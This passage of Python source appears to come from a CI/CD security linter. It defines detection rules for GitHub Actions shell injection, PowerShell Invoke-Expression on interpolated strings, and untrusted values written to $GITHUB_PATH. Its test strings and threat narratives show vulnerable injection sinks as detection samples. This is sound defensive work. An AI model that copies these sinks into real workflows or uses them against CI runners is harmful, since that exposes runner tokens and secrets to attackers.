                r'"[^"]*\$\{?(GITHUB_REF_NAME|GITHUB_HEAD_REF|GITHUB_ACTOR)\}?[^"]*"',
                # Single-quoted shell context — `$VAR` inside `'...'` is
                # literal per POSIX sh §2.2.2.
                r"'[^']*\$\{?(GITHUB_REF_NAME|GITHUB_HEAD_REF|GITHUB_ACTOR)\}?[^']*'",
            ],
            heredoc_aware=True,
        ),
        remediation=(
            "Always double-quote attacker-controlled GitHub env vars in shell:\n"
            '  - echo "$GITHUB_HEAD_REF"\n'
            "For values passed to subcommands that may parse the value, sanitize:\n"
            '  - SAFE_REF="${GITHUB_HEAD_REF//[^a-zA-Z0-9._-]/}"\n'
            '  - docker tag image:latest "image:$SAFE_REF"'
        ),
        reference=(
            "https://docs.github.com/en/actions/learn-github-actions/variables"
            "#default-environment-variables"
        ),
        test_positive=[
            "      - run: echo $GITHUB_HEAD_REF",
            "      - run: deploy.sh $GITHUB_REF_NAME",
            "      - run: echo Hi $GITHUB_ACTOR",
        ],
        test_negative=[
            '      - run: echo "$GITHUB_HEAD_REF"',
            "      - run: echo '$GITHUB_REF_NAME is safe'",
            "      # uses $GITHUB_ACTOR",
            '      - if: github.ref_name == "main"',
            # Out of scope: maintainer-controlled vars handled by SEC4-GH-020.
            "      - run: echo Target $GITHUB_BASE_REF",
            "      - run: echo Owner $GITHUB_REPOSITORY_OWNER",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Any contributor who can open a PR or push a tag chooses the "
            "value of $GITHUB_HEAD_REF / $GITHUB_REF_NAME, and the actor "
            "of a fork-triggered event chooses $GITHUB_ACTOR. An unquoted "
            "reference in a build script is a direct command-injection "
            "primitive; the injected commands run with the runner's "
            "GITHUB_TOKEN and any mounted secrets."
        ),
        incidents=[],
    ),
    # =========================================================================
    # SEC4-GH-020 — Maintainer-controlled GitHub env vars unquoted in shell
    #
    # Lint-only / hygiene companion to SEC4-GH-018. These variables
    # ($GITHUB_BASE_REF, $GITHUB_REPOSITORY_OWNER, $GITHUB_REPOSITORY,
    # $GITHUB_WORKFLOW, $GITHUB_JOB) are populated from values the
    # workflow's own repo or maintainer controls — not the PR author.
    # An unquoted reference is still a quoting bug worth fixing, but
    # the threat surface is fundamentally different (no attacker
    # injection primitive), so it doesn't deserve HIGH severity or a
    # PPE narrative.
    # =========================================================================
    Rule(
        id="SEC4-GH-020",
        title=(
            "Maintainer-controlled GitHub auto-env var used unquoted in shell "
            "(hygiene)"
        ),
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        confidence="low",
        description=(
            "GitHub auto-populated env vars whose values are not "
            "attacker-controlled — `$GITHUB_BASE_REF` (PR target "
            "branch), `$GITHUB_REPOSITORY_OWNER`, "
            "`$GITHUB_REPOSITORY`, `$GITHUB_WORKFLOW`, `$GITHUB_JOB` "
            "— are still subject to standard shell-quoting hygiene: "
            "an unquoted reference can break on values containing "
            "spaces or special characters. Unlike "
            "$GITHUB_HEAD_REF / $GITHUB_REF_NAME / $GITHUB_ACTOR "
            "(handled by SEC4-GH-018), these values are chosen by "
            "the workflow's own repository or by GitHub's runtime, "
            "so this is a quoting hygiene finding, not a command-"
            "injection finding."
        ),
        pattern=RegexPattern(
            match=(
                r"\$\{?(GITHUB_BASE_REF|GITHUB_REPOSITORY_OWNER|"
                r"GITHUB_REPOSITORY|GITHUB_WORKFLOW|GITHUB_JOB)\}?"
            ),
            exclude=[
                r"^\s*#",
                r"^\s*[\w_]+:\s*\$\{?GITHUB_",
                r"^\s*[\w_]+:\s*'[^']*\$",
                r'^\s*[\w_]+:\s*"[^"]*\$',
                r"^\s*-?\s*if:",
                r'"[^"]*\$\{?(GITHUB_BASE_REF|GITHUB_REPOSITORY_OWNER|'
                r"GITHUB_REPOSITORY|GITHUB_WORKFLOW|GITHUB_JOB)\}?[^\"]*\"",
                r"'[^']*\$\{?(GITHUB_BASE_REF|GITHUB_REPOSITORY_OWNER|"
                r"GITHUB_REPOSITORY|GITHUB_WORKFLOW|GITHUB_JOB)\}?[^']*'",
            ],
            heredoc_aware=True,
        ),
        remediation=(
            "Quote these variables in shell as a hygiene measure:\n"
            '  - pre-commit run --from-ref "origin/$GITHUB_BASE_REF" --to-ref HEAD'
        ),
        reference=(
            "https://docs.github.com/en/actions/learn-github-actions/variables"
            "#default-environment-variables"
        ),
        test_positive=[
            "      - run: pre-commit run --from-ref origin/$GITHUB_BASE_REF --to-ref HEAD",
            "      - run: echo Owner $GITHUB_REPOSITORY_OWNER",
        ],
        test_negative=[
            '      - run: echo "$GITHUB_BASE_REF"',
            # Out of scope: attacker-controlled vars handled by SEC4-GH-018.
            "      - run: echo $GITHUB_HEAD_REF",
            "      - run: echo $GITHUB_REF_NAME",
        ],
        stride=["T"],
        threat_narrative=(
            "Maintainer-controlled GitHub env vars don't carry an "
            "attacker-injection primitive, but unquoted references "
            "still break on values containing whitespace or shell-"
            "active characters. Quoting hygiene is the fix; severity "
            "kept at MEDIUM with low confidence to reflect the lint-"
            "only nature of the finding."
        ),
        incidents=[],
    ),
    # =========================================================================
    # CICD-SEC-4 continued — PowerShell Invoke-Expression on interpolated
    # string (closes FINDINGS §F-4)
    # =========================================================================
    Rule(
        id="SEC4-GH-017",
        title="PowerShell Invoke-Expression on an interpolated string",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            'PowerShell `iex "$(...)"` / `iex "$var"` / `Invoke-Expression "..."` '
            "re-parses its argument AS POWERSHELL SOURCE. The enclosing "
            "double quotes tell PowerShell to INTERPOLATE the subexpression "
            "or variable before iex runs — by the time iex sees the string, "
            "the interpolated value is spliced in and will be parsed as "
            "code. Any attacker-influenced value becomes PowerShell source. "
            'Structurally identical to shell `eval "$VAR"` (SEC4-GL-006). '
            "Distinct from SEC6-GH-007's iex branch, which catches iex on "
            "REMOTE-FETCH payloads (DownloadString, WebClient, etc.); this "
            "rule catches iex on LOCAL interpolation surfaces that don't "
            "necessarily involve network fetch."
        ),
        pattern=RegexPattern(
            # iex / Invoke-Expression followed by a double-quoted string
            # whose body contains either `$(` (subexpression) or `$<letter>`
            # (bare variable). Single-quoted ('...') bodies in PowerShell
            # don't interpolate and are intentionally NOT matched.
            match=(
                r"\b(iex|Invoke-Expression)\b\s+"
                r"\"[^\"]*\$(?:\(|[A-Za-z_])"
            ),
            exclude=[r"^\s*#"],
            heredoc_aware=True,
        ),
        remediation=(
            "Don't use iex on interpolated strings. If you need to execute a "
            "command whose name is data, use `&` (call operator) with a "
            "validated command-string variable:\n"
            "  $cmd = Get-AllowedCommand $Input  # validated against a whitelist\n"
            "  & $cmd arg1 arg2\n"
            "Never iex a double-quoted string containing attacker-influenced "
            "variables."
        ),
        reference="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression",
        test_positive=[
            "      - run: pwsh -c 'iex \"$($MyVariable)\"'",
            "      - run: pwsh -c 'iex \"$env:USER_INPUT\"'",
            "      - run: pwsh -c 'Invoke-Expression \"$($Data)\"'",
        ],
        test_negative=[
            "      - run: pwsh -c 'iex (Get-Content ./local.ps1)'",
            "      - run: pwsh -c 'iex \"literal command\"'",
            "      # - run: pwsh -c 'iex \"$($X)\"'  (commented out)",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "PowerShell's double-quoted strings interpolate their body before "
            "the string is used. When iex receives such a string, the "
            "interpolated value is splice-in code that iex then parses and "
            "runs. An attacker who can set or influence the interpolated "
            "variable owns execution with the runner's secrets and token."
        ),
        incidents=[],
    ),
    # =========================================================================
    # SEC4-GH-019: GITHUB_PATH injection — CRITICAL
    # =========================================================================
    Rule(
        id="SEC4-GH-019",
        title="Attacker-controlled value written to GITHUB_PATH",
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Attacker-controlled GitHub context value (PR title, issue body, head_ref, etc.) "
            "is written directly to $GITHUB_PATH. This prepends a PATH entry for ALL "
            "subsequent steps — more severe than GITHUB_ENV injection because every "
            "unqualified command lookup (including `git`, `node`, `python`, tool shims "
            "baked into later actions) traverses the injected entry first. "
            "If the attacker can place an executable there, they hijack arbitrary commands "
            "in later steps with no explicit reference needed. "
            "Direct twin of SEC4-GH-006 against a broader attack surface."
        ),
        pattern=RegexPattern(
            match=(
                r"\$\{\{[^}]*"
                r"(event\.(issue\.(title|body)|pull_request\.(title|body)|comment\.body"
                r"|head_commit\.message|review\.body)|head_ref)"
                r"[^}]*\}\}[^#\n]*>>\s*\$GITHUB_PATH"
            ),
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Never write attacker-controlled values to $GITHUB_PATH — every\n"
            "unqualified command lookup in later steps traverses the injected\n"
            "entry first.  Prefer a hardcoded path; if a dynamic value is\n"
            "unavoidable, allowlist at the write site with a Bash `case`:\n"
            "  env:\n    SAFE_DIR: ${{ github.event.pull_request.head.repo.owner.login }}\n"
            '  run: case "$SAFE_DIR" in trusted-org) echo "/opt/$SAFE_DIR/bin" >> $GITHUB_PATH ;; *) exit 1 ;; esac\n'
            "Run `taintly --guide SEC4-GH-019` for the full checklist."
        ),
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            '        run: echo "${{ github.event.pull_request.title }}" >> $GITHUB_PATH',
            '        run: echo "${{ github.head_ref }}" >> $GITHUB_PATH',
            '        run: echo "/tmp/${{ github.event.issue.body }}/bin" >> $GITHUB_PATH',
        ],
        test_negative=[
            '        run: echo "/opt/custom/bin" >> $GITHUB_PATH',
            '        run: echo "$SAFE_DIR" >> $GITHUB_PATH',
            '        # run: echo "${{ github.event.pull_request.title }}" >> $GITHUB_PATH',
        ],
        stride=["E", "T"],
        threat_narrative=(
            "Writing attacker-controlled values to $GITHUB_PATH prepends a directory to the "
            "search path for every subsequent step in the job. Unlike $GITHUB_ENV injection, "
            "which only affects steps that reference the injected variable, PATH injection "
            "hijacks any unqualified command lookup — an attacker need not know which specific "
            "commands later steps will run. A single write that places the attacker's directory "
            "before /usr/bin owns execution of every later tool invocation in the job."
        ),
        incidents=[],
    ),
]
